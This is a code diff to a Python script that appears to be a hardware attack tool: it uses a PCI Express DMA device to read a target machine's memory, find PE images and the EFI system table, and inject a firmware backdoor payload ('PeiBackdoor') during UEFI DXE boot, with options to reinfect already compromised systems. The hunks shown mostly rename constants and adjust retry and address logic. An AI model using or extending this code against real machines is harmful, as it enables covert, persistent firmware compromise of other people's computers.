@@ -12,17 +12,21 @@ BACKDOOR_ADDR = 0x10000
 # physical address where exploitation status info will be stored
 STATUS_ADDR = 0x1000 - (8 * 2)
 
-MAX_PE_HEADER_SIZE = 0x400
-MAX_TSEG_SIZE = 0x800000
-
+# force to re-infect the system even when payload was already planted
 ALLOW_REINFECT = True
 
-DOS_HEADER_MAGIC = 'MZ'
-
-# See struct _INFECTOR_CONFIG in PeiBackdoor.h
+# see struct _INFECTOR_CONFIG in PeiBackdoor.h
 INFECTOR_CONFIG_SECTION = '.conf'
 INFECTOR_CONFIG_FMT = 'QQQ'
 INFECTOR_CONFIG_LEN = 8 + 8 + 8
+
+# how many seconds to sleep between device connect attempts
+RETRY_SLEEP = 2
+
+HEADER_SIZE = 0x400
+HEADER_MAGIC = 'MZ'
+
+MAX_TSEG_SIZE = 0x800000
 
 
 def _infector_config_offset(pe):
@@ -69,6 +73,8 @@ def infector_get_image(payload, locate_protocol, system_table):
     # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
     entry_rva, _, _ = _infector_config_get(pe_payload, data)
     config_rva = _infector_config_offset(pe_payload)
+
+    entry_rva -= pe_payload.OPTIONAL_HEADER.ImageBase
     
     # write updated _INFECTOR_CONFIG back to the payload image
     data = _infector_config_set(pe_payload, data, entry_rva, locate_protocol, system_table)
@@ -116,7 +122,7 @@ def find_pe(dev, addr, size = 0x10000000, step = 1):
     while ptr < size:
 
         # check for DOS header
-        if dev.mem_read(addr + ptr, 2) == DOS_HEADER_MAGIC:
+        if dev.mem_read(addr + ptr, 2) == HEADER_MAGIC:
 
             return addr + ptr
         
@@ -146,7 +152,7 @@ def find_sys_table(dev, addr):
         return None
 
     # read PE image header
-    pe = pefile.PE(data = dev.mem_read(addr, MAX_PE_HEADER_SIZE))
+    pe = pefile.PE(data = dev.mem_read(addr, HEADER_SIZE))
 
     # check for EFI_SYSTEM_TABLE at the beginning of the .data section
     for section in pe.sections:
@@ -187,7 +193,7 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
             dev = TransactionLayer() if dev is None else dev
 
             # try to read some memory 
-            if dev.mem_read(BACKDOOR_ADDR, 2) == DOS_HEADER_MAGIC:
+            if dev.mem_read(BACKDOOR_ADDR, 2) == HEADER_MAGIC:
 
                 if not ALLOW_REINFECT:
 
@@ -209,7 +215,7 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
             print('[!] ' + str(e))        
 
         # system is not ready yet
-        time.sleep(0.1)
+        time.sleep(RETRY_SLEEP)
     
     print('[+] PCI-E link with target is up')
 
@@ -231,7 +237,7 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
                 image = base - ptr
                 
                 # check for DOS header
-                if dev.mem_read(image, 2) == DOS_HEADER_MAGIC:
+                if dev.mem_read(image, 2) == HEADER_MAGIC:
 
                     print('[+] PE image is at 0x%x' % image)
 
@@ -239,8 +245,7 @@ def dxe_inject(payload = None, system_table = None, status_addr = STATUS_ADDR):
                     if g_st is not None:
 
                         print('[+] EFI_SYSTEM_TABLE is at 0x%x' % g_st)
-
-                    break
+                        break
 
                 ptr += 0x20 * PAGE_SIZE
 
